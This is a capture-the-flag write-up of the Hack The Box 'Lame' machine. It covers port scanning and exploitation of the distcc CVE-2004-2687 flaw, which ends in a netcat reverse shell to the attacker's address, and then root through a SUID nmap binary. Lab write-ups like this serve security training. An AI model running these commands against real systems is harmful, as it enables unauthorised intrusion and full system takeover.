# HTB Lame

***Overview**: Lame is a easy rated machine on Hackthebox that exploits the Distcc service vulnerable to CVE-2004-2687 which allows us to execute arbitrary code to gain foothold to the machine and then escalates privileges by exploiting the nmap SUID binary.*

## Scanning and Enumeration

- So we start by scanning for open ports using masscan

```shell
┌──(kali㉿kali)-[~/HTB/Lame]
└─$ sudo masscan -p1-65535 10.10.10.3 --rate=1000 -e tun0 > ports

┌──(kali㉿kali)-[~/HTB/Lame]
└─$ cat ports

┌──(kali㉿kali)-[~/HTB/Lame]
└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
```

- then we go ahead to scan for the services on those open ports

```shell
┌──(kali㉿kali)-[~/HTB/Lame]

### FTP Enumeration

- we tried to places files into the ftp server but we don't have access to do so and neither did we see any useful files in the ftp server

![](assets/Lame_assets/Pasted%20image%2020231111160110.png)

### SMB Enumeration

- So we can enumerate for open shares and we can see some of them

![](assets/Lame_assets/Pasted%20image%2020231111160047.png)

- we also have read access to the tmp directory but that is about it.

![](assets/Lame_assets/Pasted%20image%2020231111160017.png)

### Enumerating Distcc: Port 3632

Resource: [https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc](https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc)

```ad-note
DistCC (Distributed Compiler Client/Server) is a tool for speeding up the compilation of source code using distributed computing over a network. it comprises of a server distccd and a client discc, the server accepts and runs the compilation tasks for clients.
- it distributes these compilation tasks accross multiple machines on the network
- first of all it analyses the source code and divides its into smaller tasks
- then it send the tasks to other machines on the network known as "Compiler Hosts" (Servers) that also habe distcc running
```

> Vulnerable to cve2004-2687
> Distcc 2.x when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.


- so we go ahead to scan if the application is vulnerable to the cve2004-2687 vulnerability, and we can see that it is indeed vulnerable

```shell
┌──(kali㉿kali)-[~/HTB/Lame]
└─$ nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 -Pn

## Exploitation: CVE-2004-2687

- So utilizing the exploit at  [https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855), we can check by running the id command and we can see that it does go through, we can also run the ls command too

```shell
┌──(kali㉿kali)-[~/HTB/Lame]
└─$ python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "id"
[OK] Connected to remote service

--- BEGIN BUFFER ---

uid=1(daemon) gid=1(daemon) groups=1(daemon)


--- END BUFFER ---

[OK] Done.
```

![](assets/Lame_assets/Pasted%20image%2020231111155940.png)

- we then get a shell by executing a reverse shell with nc

```shell
python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.7 4444 -e /bin/bash"
```

![](assets/Lame_assets/Pasted%20image%2020231111160657.png)

- and in our nc listener, we get shell

![](assets/Lame_assets/Pasted%20image%2020231111160739.png)

- we can view the user file

![](assets/Lame_assets/Pasted%20image%2020231111164111.png)

## Privilege Escalation

- so we run linpeas for post exploitation enumeration

![](assets/Lame_assets/Pasted%20image%2020231111163911.png)

![](assets/Lame_assets/Pasted%20image%2020231111164022.png)

- we can see that the nmap binary has the SUID bit set

![](assets/Lame_assets/Pasted%20image%2020231111164414.png)
- so we get an interactive shell using nmap by running

```shell
nmap --interactive
```

- and we have root access

![](assets/Lame_assets/Pasted%20image%2020231111202808.png)

- we can view the root file

![](assets/Lame_assets/Pasted%20image%2020231111202745.png)
